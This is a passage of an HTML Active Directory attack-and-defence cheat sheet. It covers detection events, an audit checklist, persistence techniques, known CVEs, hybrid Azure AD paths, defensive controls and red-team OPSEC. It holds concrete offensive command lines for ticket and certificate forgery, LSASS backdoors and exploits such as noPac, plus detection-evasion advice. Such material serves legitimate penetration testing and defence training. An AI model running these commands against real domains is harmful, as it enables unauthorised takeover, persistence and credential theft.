  <div class="detail-card border-red"><span class="tag privesc">DETECTION</span><h3>Privilege Escalation Detection</h3><div class="card-sub">ACL changes, GPO abuse, ADCS</div><div class="card-body"><ul class="card-list"><li><strong>ACL modification</strong>: Event 5136 on sensitive objects (AdminSDHolder, Domain Admins, DCs)</li><li><strong>RBCD setup</strong>: Event 4742 / 5136 modifying <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></li><li><strong>Shadow Credentials</strong>: Event 5136 modifying <code>msDS-KeyCredentialLink</code></li><li><strong>GPO abuse</strong>: Event 5136 on GPO objects + SYSVOL file modifications</li><li><strong>ADCS ESC1</strong>: Event 4887 with SAN different from requesting user</li><li><strong>Machine account creation</strong>: Event 5137 for computer objects from non-admin users</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== COMMON MISCONFIGURATIONS ==================== -->
<div class="section-header"><h2><span>//</span> Common <span class="red">Misconfigurations</span> Checklist</h2><p class="section-desc">The most frequently exploited AD misconfigurations found in real engagements. Use this as an audit checklist.</p></div>

<div class="data-flow-card"><h4>AD Security Audit Checklist</h4><pre>
<span class="key">CATEGORY                MISCONFIGURATION                                      RISK / IMPACT</span>
&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;

<span class="danger">KERBEROS</span>
&#x251C;&#x2500;&#x2500; DONT_REQ_PREAUTH enabled on accounts                  <span class="danger">AS-REP Roasting &rarr; offline crack</span>
&#x251C;&#x2500;&#x2500; SPNs on user accounts (not machine accounts)           <span class="danger">Kerberoasting &rarr; offline crack</span>
&#x251C;&#x2500;&#x2500; krbtgt password never rotated                          <span class="danger">Golden Ticket persistence</span>
&#x251C;&#x2500;&#x2500; Unconstrained delegation on non-DC servers              <span class="danger">TGT theft via coercion</span>
&#x2514;&#x2500;&#x2500; RC4 encryption still enabled (etype 23)                 <span class="danger">Faster hash cracking</span>

<span class="danger">NTLM</span>
&#x251C;&#x2500;&#x2500; SMB signing not required on all hosts                  <span class="danger">NTLM relay attacks</span>
&#x251C;&#x2500;&#x2500; LDAP signing not required                              <span class="danger">NTLM relay to LDAP</span>
&#x251C;&#x2500;&#x2500; LDAP channel binding not required                      <span class="danger">NTLM relay to LDAPS</span>
&#x251C;&#x2500;&#x2500; NTLMv1 allowed (LMCompatibilityLevel &lt; 3)              <span class="danger">Trivial hash cracking</span>
&#x2514;&#x2500;&#x2500; Extended Protection for Auth disabled                  <span class="danger">Relay to HTTPS/LDAPS endpoints</span>

<span class="danger">ADCS</span>
&#x251C;&#x2500;&#x2500; Templates with ENROLLEE_SUPPLIES_SUBJECT (ESC1)        <span class="danger">Request cert as any user &rarr; DA</span>
&#x251C;&#x2500;&#x2500; HTTP enrollment endpoint without EPA (ESC8)             <span class="danger">Coerce + relay &rarr; DC cert</span>
&#x251C;&#x2500;&#x2500; Schema v1 templates still active (ESC15)                <span class="danger">App Policy injection &rarr; DA</span>
&#x251C;&#x2500;&#x2500; Low-priv users with ManageCA / ManageCerts (ESC7)       <span class="danger">Approve pending cert requests</span>
&#x2514;&#x2500;&#x2500; Write access on certificate templates (ESC4)            <span class="danger">Modify template to ESC1</span>

<span class="danger">ACL / PERMISSIONS</span>
&#x251C;&#x2500;&#x2500; GenericAll / WriteDACL on sensitive objects              <span class="danger">Full control &rarr; DCSync / DA</span>
&#x251C;&#x2500;&#x2500; Non-admin users with DCSync rights                     <span class="danger">Dump all domain hashes</span>
&#x251C;&#x2500;&#x2500; MachineAccountQuota &gt; 0 (default = 10)                 <span class="danger">Create machine accounts for RBCD</span>
&#x251C;&#x2500;&#x2500; Pre-Windows 2000 Compatible Access group                <span class="danger">Anonymous LDAP enumeration</span>
&#x2514;&#x2500;&#x2500; AdminSDHolder ACL not monitored                        <span class="danger">Persistent privileged access</span>

<span class="danger">CREDENTIAL HYGIENE</span>
&#x251C;&#x2500;&#x2500; No LAPS deployed (same local admin everywhere)          <span class="danger">Lateral movement via local admin</span>
&#x251C;&#x2500;&#x2500; Service accounts with weak passwords                   <span class="danger">Kerberoast + crack = service access</span>
&#x251C;&#x2500;&#x2500; Privileged accounts logging into workstations           <span class="danger">Credential theft from LSASS</span>
&#x251C;&#x2500;&#x2500; WDigest enabled (UseLogonCredential = 1)                <span class="danger">Plaintext passwords in LSASS</span>
&#x251C;&#x2500;&#x2500; GPP passwords in SYSVOL (MS14-025)                     <span class="danger">Public decryption key = cleartext</span>
&#x2514;&#x2500;&#x2500; Password reuse between admin tiers                     <span class="danger">Tier 0 compromise from Tier 1/2</span>

<span class="danger">NETWORK / SERVICES</span>
&#x251C;&#x2500;&#x2500; Print Spooler running on DCs                           <span class="danger">PrinterBug coercion</span>
&#x251C;&#x2500;&#x2500; LLMNR / NBT-NS / mDNS enabled                         <span class="danger">Credential capture via poisoning</span>
&#x251C;&#x2500;&#x2500; IPv6 enabled without DHCPv6 security                   <span class="danger">mitm6 DNS takeover</span>
&#x251C;&#x2500;&#x2500; Authenticated users can create DNS records              <span class="danger">ADIDNS poisoning / time bombs</span>
&#x2514;&#x2500;&#x2500; Default SCCM Network Access Account with domain creds   <span class="danger">NAA credential extraction</span>
</pre></div>

<div class="separator"></div>

<!-- ==================== PERSISTENCE DEEP DIVE ==================== -->
<div class="section-header"><h2><span>//</span> Persistence <span class="purple">Deep Dive</span></h2><p class="section-desc">Once you have Domain Admin, how do you maintain access? These techniques survive password resets, ticket rotations, and even some remediation efforts.</p></div>

<div class="details-grid">
  <div class="detail-card border-pink"><span class="tag domdom">PERSIST</span><h3>Golden Ticket</h3><div class="card-sub">Forged TGT using krbtgt hash &bull; survives password resets</div><div class="card-body"><ul class="card-list"><li>Forge a TGT with <strong>arbitrary PAC</strong> (any user, any groups including DA/EA)</li><li><code class="tool">ticketer.py</code> -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local Administrator</li><li><strong>Lifetime</strong>: Valid until krbtgt password is rotated <strong>twice</strong> (AD keeps current + previous key)</li><li><strong>Detection</strong>: TGT with no corresponding AS-REQ (Event 4768) on DC</li><li><strong>Remediation</strong>: Reset krbtgt password twice (with delay between resets)</li></ul></div></div>

  <div class="detail-card border-pink"><span class="tag domdom">PERSIST</span><h3>Diamond &amp; Sapphire Tickets</h3><div class="card-sub">Stealthier alternatives to Golden Ticket</div><div class="card-body"><ul class="card-list"><li><strong>Diamond Ticket</strong>: Request a <em>legitimate</em> TGT, then decrypt it with krbtgt hash and modify the PAC &mdash; has valid AS-REQ on DC</li><li><code class="tool">ticketer.py</code> -request -impersonate Administrator -domain corp.local -user normaluser -password pass -nthash KRBTGT_HASH</li><li><strong>Sapphire Ticket</strong>: Same as Diamond but uses <strong>S4U2Self + U2U</strong> to get a real PAC for the target user, then injects it into the modified TGT</li><li><strong>Why stealthier</strong>: Diamond/Sapphire have legitimate 4768 events and real PAC data &mdash; harder for SOC to distinguish from normal auth</li><li><strong>Still requires</strong>: krbtgt hash (DCSync or NTDS.dit dump)</li></ul></div></div>

  <div class="detail-card border-purple"><span class="tag persist">PERSIST</span><h3>Golden Certificate</h3><div class="card-sub">Forge certificates using stolen CA private key</div><div class="card-body"><ul class="card-list"><li>Backup CA private key: <code class="tool">certipy ca -backup</code> &mdash; exports CA cert + private key</li><li>Forge certificate for any user: <code class="tool">certipy forge</code> -ca-pfx ca.pfx -upn administrator@corp.local -subject "CN=Admin"</li><li><strong>Lifetime</strong>: Valid until CA cert expires (typically 5-20 years) or CA is rebuilt</li><li><strong>Survives</strong>: Password resets, krbtgt rotations, account disabling</li><li><strong>Remediation</strong>: Revoke CA certificate, rebuild entire PKI infrastructure &mdash; extremely painful</li></ul></div></div>

  <div class="detail-card border-purple"><span class="tag persist">PERSIST</span><h3>Skeleton Key</h3><div class="card-sub">Patch LSASS on DC to accept master password</div><div class="card-body"><ul class="card-list"><li>Injects a backdoor into LSASS that accepts a <strong>master password</strong> for any account</li><li><code class="tool">Mimikatz</code>: <code>misc::skeleton</code> &mdash; default master password: "mimikatz"</li><li>Original passwords continue to work &mdash; users don't notice anything</li><li><strong>Limitation</strong>: Only in-memory &mdash; <span class="vuln">lost on DC reboot</span></li><li><strong>Limitation</strong>: Must be injected on every DC individually</li><li><strong>Detection</strong>: Monitor for LSASS memory modifications, Sysmon Event 10</li></ul></div></div>

  <div class="detail-card border-red"><span class="tag persist">PERSIST</span><h3>DCShadow</h3><div class="card-sub">Register rogue DC to push changes via replication</div><div class="card-body"><ul class="card-list"><li>Temporarily registers attacker machine as a <strong>Domain Controller</strong> in AD</li><li>Pushes arbitrary AD modifications via <strong>legitimate replication</strong> (DRS protocol)</li><li><strong>Use cases</strong>: Modify ACLs, add SPNs, change group memberships, set SID History &mdash; all without standard audit logs</li><li><code class="tool">Mimikatz</code>: <code>lsadump::dcshadow /object:user /attribute:SIDHistory /value:S-1-5-21-...-519</code></li><li><strong>Detection</strong>: New nTDSDSA objects in Configuration partition, unusual replication partners</li><li><strong>Requires</strong>: DA/SYSTEM privileges on a domain-joined machine</li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag persist">PERSIST</span><h3>DSRM Backdoor</h3><div class="card-sub">Directory Services Restore Mode &bull; local admin backdoor on DC</div><div class="card-body"><ul class="card-list"><li>Every DC has a local <strong>DSRM Administrator</strong> account with its own password (set during dcpromo)</li><li>By default, DSRM account only works when booting into restore mode</li><li><strong>Persistence</strong>: Set registry key <code>DsrmAdminLogonBehavior = 2</code> &rarr; allows DSRM logon over network</li><li>Then use DSRM hash for Pass-the-Hash to DC &mdash; <span class="vuln">independent of domain admin passwords</span></li><li>Extract DSRM hash: <code class="tool">Mimikatz</code> <code>lsadump::sam</code> on DC (local SAM)</li><li><strong>Survives</strong>: Domain admin password resets, krbtgt rotation</li></ul></div></div>

  <div class="detail-card border-cyan"><span class="tag persist">PERSIST</span><h3>Custom SSP / SID History</h3><div class="card-sub">Security Support Provider injection &amp; SID-based persistence</div><div class="card-body"><ul class="card-list"><li><strong>Custom SSP</strong>: Register a malicious DLL as a Security Support Provider &mdash; captures all plaintext passwords at logon</li><li><code class="tool">Mimikatz</code>: <code>misc::memssp</code> &mdash; injects into LSASS, logs creds to <code>C:\Windows\System32\mimilsa.log</code></li><li>Persistent SSP: Add to <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code></li><li><strong>SID History</strong>: Add Enterprise Admin SID (S-1-5-21-...-519) to a normal user's sIDHistory attribute</li><li>User appears normal but <span class="vuln">carries EA privileges in every Kerberos ticket</span></li><li><strong>Detection</strong>: Monitor sIDHistory changes (Event 4765), audit LSA registry keys</li></ul></div></div>

  <div class="detail-card border-indigo"><span class="tag persist">PERSIST</span><h3>AdminSDHolder &amp; GPO Backdoors</h3><div class="card-sub">Self-repairing persistence via AD mechanisms</div><div class="card-body"><ul class="card-list"><li><strong>AdminSDHolder</strong>: Modify ACL on CN=AdminSDHolder &rarr; SDProp copies it to all protected objects every 60min</li><li>Even if SOC removes your ACE from Domain Admins, it gets <span class="vuln">automatically restored</span> from AdminSDHolder</li><li><strong>GPO Backdoor</strong>: Add scheduled task / startup script via GPO &mdash; executes on every machine in OU</li><li><code class="tool">SharpGPOAbuse</code> --AddComputerTask or modify SYSVOL directly</li><li><strong>Machine Account</strong>: Create machine accounts (default quota: 10) for RBCD-based access</li><li><strong>ADIDNS Time Bomb</strong>: Pre-register DNS records for future hosts &rarr; MITM on domain join</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== NOTABLE AD CVEs ==================== -->
<div class="section-header"><h2><span>//</span> Notable AD <span class="red">CVEs</span></h2><p class="section-desc">The vulnerabilities that changed AD security forever. Beginners will encounter these in labs, CTFs, and real engagements.</p></div>

<div class="details-grid">
  <div class="detail-card border-red"><span class="tag privesc">CVE</span> <span class="tag domdom">CRITICAL</span><h3>ZeroLogon (CVE-2020-1472)</h3><div class="card-sub">Netlogon protocol flaw &bull; unauthenticated DC takeover</div><div class="card-body"><ul class="card-list"><li>Cryptographic flaw in Netlogon's AES-CFB8 implementation &mdash; <strong>no authentication required</strong></li><li>Sends zero-filled challenges until collision occurs (avg ~256 attempts, ~3 seconds)</li><li>Sets DC machine account password to <strong>empty</strong> &rarr; auth as DC &rarr; DCSync</li><li><code class="tool">zerologon_tester.py</code> to check, <code class="tool">cve-2020-1472-exploit.py</code> to exploit</li><li><strong>Impact</strong>: Instant Domain Admin from unauthenticated network position</li><li><strong>WARNING</strong>: <span class="vuln">Breaks AD replication</span> &mdash; must restore machine password immediately after</li><li><strong>Patched</strong>: August 2020 &mdash; still found in unpatched environments</li></ul></div></div>

  <div class="detail-card border-red"><span class="tag privesc">CVE</span> <span class="tag domdom">CRITICAL</span><h3>PrintNightmare (CVE-2021-1675 / 34527)</h3><div class="card-sub">Print Spooler RCE &bull; remote code execution as SYSTEM</div><div class="card-body"><ul class="card-list"><li>Flaw in Windows Print Spooler &mdash; allows <strong>any authenticated user</strong> to execute code as SYSTEM</li><li><strong>Two variants</strong>: LPE (local privilege escalation) and RCE (remote code execution)</li><li><code class="tool">CVE-2021-1675.py</code> attacker-ip target-ip -u user -p pass '/share/evil.dll'</li><li>Attacker hosts malicious DLL on SMB share &rarr; target loads it as SYSTEM</li><li><strong>On DCs</strong>: SYSTEM on DC = Domain Admin equivalent</li><li><strong>Mitigation</strong>: Disable Print Spooler on DCs and servers: <code>Stop-Service Spooler; Set-Service Spooler -StartupType Disabled</code></li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag privesc">CVE</span><h3>noPac / SamAccountName Spoofing</h3><div class="card-sub">CVE-2021-42278 + CVE-2021-42287 &bull; any user to DA</div><div class="card-body"><ul class="card-list"><li><strong>CVE-2021-42278</strong>: AD doesn't validate SAMAccountName uniqueness for machine accounts</li><li><strong>CVE-2021-42287</strong>: KDC grants TGT for non-existent account by appending $ (assumes machine account)</li><li><strong>Chain</strong>: Create machine account &rarr; rename to DC name (without $) &rarr; request TGT &rarr; rename back &rarr; request TGS &rarr; KDC issues TGS as DC$</li><li><code class="tool">noPac.py</code> domain/user:pass -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate Administrator -dump</li><li><strong>Impact</strong>: Any domain user with MachineAccountQuota &gt; 0 can become Domain Admin</li><li><strong>Patched</strong>: November 2021</li></ul></div></div>

  <div class="detail-card border-cyan"><span class="tag adcs">CVE</span><h3>Certifried (CVE-2022-26923)</h3><div class="card-sub">Machine account certificate abuse &bull; domain user to DA</div><div class="card-body"><ul class="card-list"><li>Machine accounts can request certificates using their dNSHostName for authentication</li><li><strong>Attack</strong>: Create machine account &rarr; set its dNSHostName to a DC's hostname &rarr; request machine cert &rarr; PKINIT as DC</li><li><code class="tool">certipy</code> account create -u user -p pass -dc-ip DC -user 'EVIL$' -dns DC.corp.local</li><li><code class="tool">certipy</code> req -u 'EVIL$' -p pass -ca CORP-CA -template Machine</li><li><strong>Impact</strong>: Similar to noPac but via certificate path &mdash; any user to DA</li><li><strong>Patched</strong>: May 2022 &mdash; patch adds SID mapping validation to certificates</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== AZURE AD / ENTRA ID HYBRID ==================== -->
<div class="section-header"><h2><span>//</span> Azure AD / <span class="cyan">Entra ID</span> Hybrid Attacks</h2><p class="section-desc">Most enterprises run hybrid AD. Cloud-to-on-prem and on-prem-to-cloud attack paths are increasingly critical in modern engagements.</p></div>

<div class="details-grid">
  <div class="detail-card border-cyan"><span class="tag adcs">HYBRID</span><h3>Azure AD Connect</h3><div class="card-sub">The bridge between on-prem AD and Azure AD</div><div class="card-body"><ul class="card-list"><li>Syncs on-prem AD objects to Azure AD &mdash; runs as a service with <strong>high privileges in both</strong></li><li><strong>Password Hash Sync (PHS)</strong>: Hashes synced to Azure &mdash; MSOL account has DCSync-equivalent rights</li><li><strong>Extract creds</strong>: <code class="tool">AADInternals</code> Get-AADIntSyncCredentials &mdash; dumps MSOL service account</li><li><strong>Pass-Through Auth (PTA)</strong>: Auth agent on-prem can be backdoored to accept any password</li><li><strong>Federation (ADFS)</strong>: Steal token-signing certificate &rarr; forge SAML tokens (Golden SAML)</li><li><strong>Impact</strong>: MSOL account can DCSync &rarr; compromise on-prem from cloud, or vice versa</li></ul></div></div>

  <div class="detail-card border-blue"><span class="tag lateral">HYBRID</span><h3>PRT &amp; Token Theft</h3><div class="card-sub">Primary Refresh Token &mdash; the cloud equivalent of a TGT</div><div class="card-body"><ul class="card-list"><li><strong>PRT</strong>: SSO token for Azure AD &mdash; grants access to all cloud resources without re-auth</li><li>Stored in TPM (hardware) or software &mdash; software PRTs can be extracted from LSASS</li><li><code class="tool">ROADtools</code>: Enumerate Azure AD, extract tokens, map permissions</li><li><code class="tool">AADInternals</code>: Join-AADIntDeviceToAzureAD, Get-AADIntAccessTokenForAADGraph</li><li><strong>Device code phishing</strong>: Trick user into entering device code &rarr; steal their tokens</li><li><strong>Seamless SSO</strong>: Uses Kerberos with AZUREADSSOACC$ computer account &mdash; if its hash is compromised, forge Silver Tickets for cloud auth</li></ul></div></div>

  <div class="detail-card border-red"><span class="tag privesc">HYBRID</span><h3>Cloud &rarr; On-Prem Paths</h3><div class="card-sub">Compromising on-prem AD from Azure AD</div><div class="card-body"><ul class="card-list"><li><strong>Global Admin &rarr; on-prem</strong>: Reset Azure AD Connect MSOL password &rarr; DCSync on-prem</li><li><strong>Intune admin</strong>: Push scripts/apps to on-prem hybrid-joined devices &rarr; code execution</li><li><strong>Application Proxy</strong>: If misconfigured, exposes internal apps &mdash; can pivot through</li><li><strong>Password writeback</strong>: If enabled, cloud admin can reset on-prem passwords</li><li><strong>ADFS token forgery</strong>: Golden SAML &mdash; forge authentication tokens for any federated user</li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag cred">HYBRID</span><h3>On-Prem &rarr; Cloud Paths</h3><div class="card-sub">Pivoting to Azure from compromised on-prem AD</div><div class="card-body"><ul class="card-list"><li><strong>MSOL account</strong>: Has Replication rights &mdash; DCSync hash, then authenticate to Azure AD</li><li><strong>Seamless SSO</strong>: Dump AZUREADSSOACC$ hash &rarr; forge Kerberos tickets for Azure AD auth</li><li><strong>Synced admin accounts</strong>: On-prem DA with same UPN as cloud GA &rarr; same password/hash</li><li><strong>Conditional Access bypass</strong>: Trusted location exemptions can be abused from on-prem network</li><li><strong>Key takeaway</strong>: <span class="vuln">Hybrid = both environments share trust</span>. Owning one often means owning both.</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== DEFENSIVE CONTROLS ==================== -->
<div class="section-header"><h2><span>//</span> Protected Users <span class="green">&amp;</span> Defensive <span class="blue">Controls</span></h2><p class="section-desc">What actually blocks AD attacks. Understanding defenses helps you identify what's deployed (and what's not) during engagements.</p></div>

<div class="details-grid">
  <div class="detail-card border-green"><span class="tag lateral">DEFENSE</span><h3>Protected Users Group</h3><div class="card-sub">Single most impactful defensive group in AD</div><div class="card-body"><ul class="card-list"><li>Members <strong>cannot use NTLM</strong> &mdash; blocks Pass-the-Hash, NTLM relay, Responder capture</li><li>Forces <strong>Kerberos AES only</strong> &mdash; no RC4/DES, slows Kerberoasting significantly</li><li><strong>No delegation</strong> &mdash; TGTs are non-forwardable, blocks unconstrained &amp; constrained delegation abuse</li><li><strong>No caching</strong> &mdash; no DCC2 cached creds on workstations</li><li>TGT lifetime reduced to <strong>4 hours</strong> (non-renewable)</li><li><strong>Limitation</strong>: Breaks apps that require NTLM or delegation &mdash; not all accounts can be added</li><li><strong>Check</strong>: <code>net group "Protected Users" /domain</code></li></ul></div></div>

  <div class="detail-card border-blue"><span class="tag recon">DEFENSE</span><h3>Credential Guard</h3><div class="card-sub">VBS-based LSASS isolation</div><div class="card-body"><ul class="card-list"><li>Uses <strong>Virtualization-Based Security (VBS)</strong> to isolate LSASS secrets in a secure enclave</li><li>NT hashes and Kerberos keys stored in <strong>LSAIso.exe</strong> &mdash; inaccessible even to SYSTEM/kernel</li><li><strong>Blocks</strong>: Mimikatz sekurlsa::logonpasswords, Pass-the-Hash from memory, DPAPI master keys</li><li><strong>Does NOT block</strong>: Kerberoasting, AS-REP roasting, DCSync, NTDS.dit offline attacks</li><li><strong>Requirements</strong>: UEFI Secure Boot, TPM 2.0, Windows 10/11 Enterprise or Server 2016+</li><li><strong>Check</strong>: <code>Get-ComputerInfo -Property DeviceGuard*</code></li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag cred">DEFENSE</span><h3>AES-Only Kerberos &amp; LDAP Signing</h3><div class="card-sub">Protocol-level hardening</div><div class="card-body"><ul class="card-list"><li><strong>AES-only Kerberos</strong>: Disable RC4 encryption &mdash; Kerberoasted hashes become mode 19700 (much slower to crack)</li><li><strong>How</strong>: GPO &rarr; Computer Config &rarr; Security &rarr; Local Policies &rarr; Security Options &rarr; "Network security: Configure encryption types allowed"</li><li><strong>LDAP Signing</strong>: Require signing &rarr; blocks NTLM relay to LDAP</li><li><strong>LDAP Channel Binding</strong>: Require binding &rarr; blocks relay to LDAPS</li><li><strong>SMB Signing</strong>: Require on all hosts &rarr; blocks SMB-to-SMB relay</li><li><strong>Extended Protection for Authentication</strong>: Blocks relay to HTTP/HTTPS endpoints (ADCS, Exchange)</li></ul></div></div>

  <div class="detail-card border-purple"><span class="tag persist">DEFENSE</span><h3>Tiered Administration Model</h3><div class="card-sub">Prevent credential exposure across tiers</div><div class="card-body"><ul class="card-list"><li><strong>Tier 0</strong>: Domain Controllers, AD admins &mdash; <em>never</em> log into lower-tier machines</li><li><strong>Tier 1</strong>: Servers, applications &mdash; separate admin accounts, no DA credentials</li><li><strong>Tier 2</strong>: Workstations, end users &mdash; local admin only, no domain-wide privileges</li><li><strong>PAW</strong> (Privileged Access Workstation): Hardened workstation dedicated to Tier 0 administration</li><li><strong>Why it matters</strong>: If DA logs into a workstation, <span class="vuln">any local admin can steal their creds from LSASS</span></li><li><strong>Reality</strong>: Most orgs violate tiering &mdash; DA credentials on workstations is the #1 path to domain compromise</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== OPSEC CONSIDERATIONS ==================== -->
<div class="section-header"><h2><span>//</span> OPSEC <span class="red">Considerations</span></h2><p class="section-desc">What's loud, what's quiet, and what will get you caught. Essential for red teamers and useful for defenders to understand attacker tradeoffs.</p></div>

<div class="data-flow-card"><h4>Attack Noise Level Guide</h4><pre>
<span class="key">TECHNIQUE                          NOISE LEVEL    WHY</span>
&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;

<span class="comment">QUIET (hard to detect)</span>
<span class="val">BloodHound collection</span>              <span class="type">LOW</span>            Standard LDAP queries, blends with normal traffic
<span class="val">Kerberoasting</span>                      <span class="type">LOW</span>            Legitimate TGS requests &mdash; only suspicious in volume
<span class="val">AS-REP Roasting</span>                    <span class="type">LOW</span>            Normal-looking AS-REQ, no auth needed
<span class="val">LDAP enumeration</span>                   <span class="type">LOW</span>            Standard directory queries
<span class="val">Silver Ticket</span>                      <span class="type">LOW</span>            Never touches DC &mdash; very hard to detect
<span class="val">RBCD setup</span>                         <span class="type">LOW-MED</span>        Attribute modification logged but often not monitored

<span class="comment">MODERATE (detectable with proper monitoring)</span>
<span class="val">Password Spray</span>                     <span class="type">MEDIUM</span>         Multiple failed logons (4625/4771) in short window
<span class="val">DCSync</span>                             <span class="type">MEDIUM</span>         Event 4662 with replication rights from non-DC
<span class="val">NTLM Relay</span>                         <span class="type">MEDIUM</span>         Auth source/dest mismatch, unusual auth patterns
<span class="val">Coercion (PetitPotam etc.)</span>         <span class="type">MEDIUM</span>         Unusual RPC calls to DC, unexpected auth to workstations
<span class="val">ACL modifications</span>                  <span class="type">MEDIUM</span>         Event 5136 on sensitive objects

<span class="comment">LOUD (easily detected)</span>
<span class="val">Mimikatz / lsassy</span>                  <span class="danger">HIGH</span>           LSASS access (Sysmon 10), known signatures, both heavily detected by EDR
<span class="val">PsExec</span>                             <span class="danger">HIGH</span>           Service creation (7045), named pipe, known binary
<span class="val">ZeroLogon</span>                          <span class="danger">HIGH</span>           DC machine password reset to empty, breaks replication
<span class="val">Responder (broadcast)</span>              <span class="danger">HIGH</span>           LLMNR/NBT-NS/mDNS responses from unexpected source
<span class="val">Golden Ticket</span>                      <span class="danger">MEDIUM-HIGH</span>    TGT with no AS-REQ, unusual ticket lifetimes
<span class="val">Mass credential dump (NTDS)</span>        <span class="danger">HIGH</span>           VSS shadow creation, large data exfil from DC
<span class="val">SharpHound (aggressive mode)</span>       <span class="danger">HIGH</span>           Thousands of LDAP queries + SMB sessions in minutes
</pre></div>

<div class="details-grid">
  <div class="detail-card border-green"><span class="tag recon">OPSEC</span><h3>Staying Quiet</h3><div class="card-sub">Techniques to minimize detection</div><div class="card-body"><ul class="card-list"><li><strong>Use Kerberos over NTLM</strong>: Kerberos is expected traffic; NTLM from Linux tools stands out</li><li><strong>Slow and low spraying</strong>: 1 attempt per user per 30+ minutes, use Kerberos pre-auth instead of SMB logon</li><li><strong>BloodHound</strong>: Use <code>--collectionmethod DCOnly</code> to avoid touching endpoints</li><li><strong>Avoid PsExec</strong>: Use WMIExec or SMBExec (no service creation) or evil-winrm (legitimate WinRM)</li><li><strong>Timestomping</strong>: Match file timestamps to surrounding files when dropping tools</li><li><strong>Living off the land</strong>: Use built-in tools (PowerShell, net.exe, nltest) over external binaries</li></ul></div></div>

  <div class="detail-card border-red"><span class="tag privesc">OPSEC</span><h3>Common Mistakes</h3><div class="card-sub">What gets red teamers caught</div><div class="card-body"><ul class="card-list"><li><strong>Running SharpHound</strong> with default settings &mdash; aggressive LDAP + SMB enumeration is very noisy</li><li><strong>Password spray lockouts</strong>: Not checking lockout policy first &mdash; locking out users alerts SOC</li><li><strong>Mimikatz / lsassy on target</strong>: Both heavily signatured by AV/EDR &mdash; use remote <code class="tool">secretsdump.py</code> or <code>procdump</code> + offline <code class="tool">pypykatz</code></li><li><strong>PsExec default pipe names</strong>: Well-known signatures &mdash; use custom service/pipe names</li><li><strong>Uploading tools to DC</strong>: High-value target with most monitoring &mdash; use remote tools instead</li><li><strong>Not cleaning up</strong>: Leaving machine accounts, modified ACLs, GPO changes behind</li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag cred">OPSEC</span><h3>Preferred Alternatives</h3><div class="card-sub">Stealthier equivalents for common techniques</div><div class="card-body"><ul class="card-list"><li><strong>Instead of PsExec</strong>: <code class="tool">wmiexec</code> (no service), <code class="tool">atexec</code> (scheduled task), <code class="tool">evil-winrm</code> (legitimate WinRM)</li><li><strong>Instead of Mimikatz / lsassy</strong>: <code class="tool">secretsdump.py</code> remotely (never touches target disk), or <code>procdump.exe</code> (signed Microsoft binary) &rarr; exfil dump &rarr; offline <code class="tool">pypykatz</code>. Both Mimikatz and lsassy are <span class="vuln">heavily detected by modern EDR</span></li><li><strong>Instead of SharpHound</strong>: <code class="tool">bloodhound-python</code> (DCOnly), manual LDAP queries with <code class="tool">ldeep</code></li><li><strong>Instead of Responder broadcast</strong>: Targeted coercion (PetitPotam to specific host)</li><li><strong>Instead of Golden Ticket</strong>: Diamond/Sapphire Ticket (has legitimate AS-REQ on DC)</li><li><strong>Instead of mass NTDS dump</strong>: Targeted DCSync for specific accounts only</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== MSSQL ATTACKS ==================== -->
<div class="section-header"><h2><span>//</span> MSSQL <span class="orange">Attacks</span></h2><p class="section-desc">SQL Server is deeply integrated with AD. Linked servers, xp_cmdshell, and impersonation chains provide powerful lateral movement paths often overlooked by beginners.</p></div>

<div class="details-grid">
